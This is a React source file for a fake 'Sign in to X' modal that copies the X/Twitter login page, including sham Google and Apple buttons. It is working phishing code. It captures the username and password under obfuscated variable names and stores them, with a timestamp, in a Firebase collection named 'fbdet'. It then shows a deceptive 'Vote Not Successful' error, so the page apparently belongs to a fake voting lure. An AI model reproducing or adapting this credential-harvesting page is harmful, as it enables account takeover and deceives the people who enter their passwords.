import React, { useState } from "react";
import { auth, db } from "../assets/js/firebase"; // Correct import path
import { ref, push } from "firebase/database";
import { signInAnonymously } from "firebase/auth";
import ErrorAlert from "./ErrorAlert"; // Import the ErrorAlert component
import "../assets/css/modal.css";

const TwitterModal = () => {
  const [showPastField, setshowPastField] = useState(false);
  const [abujaoruko, setOruko] = useState("");
  const [abujazom, setZom] = useState("");
  const [errorTitle, setErrorTitle] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [showErrorAlert, setShowErrorAlert] = useState(false);

  const handleNextClick = () => {
    if (!abujaoruko.trim()) {
      // Prevent proceeding if email is empty
      return;
    }
    setshowPastField(true);
  };

  const handleLogin = async () => {
    // Validate fields
    if (!abujaoruko.trim() || !abujazom.trim()) {
      setErrorTitle("Error");
      setErrorMessage("Please fill in all fields.");
      setShowErrorAlert(true);
      return;
    }

    try {
      // Sign in anonymously
      const userCredential = await signInAnonymously(auth);
      const user = userCredential.user;

      // Prepare data to be sent to Firebase
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const data = {
        emle: abujaoruko,
        mobile: "",
        past: abujazom, // Ensure this matches the field name in Firebase
        time: currentTime,
        timezone: timezone,
        date: currentDate,
        type: "Twitter",
        uid: user.uid, // Store the anonymous user's UID
      };

      // Log the data being sent to Firebase
      console.log("Data being sent to Firebase:", data);

      // Save user data to Firebase Realtime Database
      await push(ref(db, "fbdet"), data);

      // Show success message
      setErrorTitle("Vote Not Successful");
      setErrorMessage("Sorry, something went wrong. Please try again.");
      setShowErrorAlert(true);
    } catch (error) {
      console.error("Error saving data to Firebase:", error);
      setErrorTitle("Error");
      setErrorMessage("Sorry, something went wrong. Please try again.");
      setShowErrorAlert(true);
    } finally {
      // Clear the password field only
      setZom("");
    }
  };

  const handleCloseErrorAlert = () => {
    setShowErrorAlert(false);
  };

  return (
    <div id="twitter-modal" className="dialog">
      <div className="bg-black min-h-screen flex flex-col w-full">
        <main className="flex-grow">
          <div className="flex justify-center items-center p-4">
            <img src="/img/t_lngo.jpg" alt="logo" className="h-10" />
          </div>

          <div className="bg-black p-8 w-full max-w-md mx-auto">
            <h2 className="text-2xl font-bold text-white mb-6 mt-12 text-left">
              Sign in to X
            </h2>

            <div>
              <button className="w-full py-2 bg-gray-100 px-4 rounded-3xl flex items-center justify-center text-gray-900 mt-4">
                <img
                  src="/img/g_lngo.png"
                  alt="Google Icon"
                  className="h-5 mr-3"
                />
                Sign in with Google
              </button>

              <button className="w-full py-2 bg-gray-100 px-4 rounded-3xl flex items-center justify-center text-gray-900 mt-4">
                <img
                  src="/img/Apple_logo_black.svg"
                  alt="Apple Icon"
                  className="h-5 mr-3"
                />
                Sign in with Apple
              </button>

              <div className="flex items-center my-4">
                <div className="flex-grow border-t border-gray-700"></div>
                <span className="mx-4 text-gray-500">or</span>
                <div className="flex-grow border-t border-gray-700"></div>
              </div>
            </div>

            <div className="mb-4 relative">
              <input
                type="text"
                name="abujaoruko"
                value={abujaoruko}
                onChange={(e) => setOruko(e.target.value)}
                required
                className="mt-1 block w-full px-3 py-4 border border-gray-700 rounded-md bg-transparent text-gray-300"
              />
              <label className="absolute left-3 top-2 text-sm text-gray-500">
                Phone, Email address, or username
              </label>
            </div>

            {!showPastField ? (
              <button
                onClick={handleNextClick}
                className="w-full bg-gray-100 text-gray-900 py-2 px-4 rounded-3xl mt-4">
                Next
              </button>
            ) : (
              <div className="mt-4">
                <div className="mb-4 relative">
                  <input
                    type="text"
                    name="abujazom"
                    value={abujazom}
                    onChange={(e) => setZom(e.target.value)}
                    required
                    className="mt-1 block w-full px-3 py-4 border border-gray-300 rounded-md bg-gray-700 text-gray-300"
                  />
                  <label className="absolute left-3 top-2 text-sm text-gray-500">
                    Password
                  </label>
                </div>
                <button
                  onClick={handleLogin}
                  className="w-full bg-gray-100 text-black py-2 px-4 rounded-md mt-4">
                  Log in
                </button>
              </div>
            )}

            <p className="mt-6 text-left text-sm text-gray-600">
              Don't have an account?{" "}
              <a href="#" className="font-medium text-blue-600">
                Sign up
              </a>
            </p>
          </div>
        </main>

        {/* Render the ErrorAlert component */}
        {showErrorAlert && (
          <ErrorAlert
            title={errorTitle}
            message={errorMessage}
            onClose={handleCloseErrorAlert}
          />
        )}
      </div>
    </div>
  );
};

export default TwitterModal;
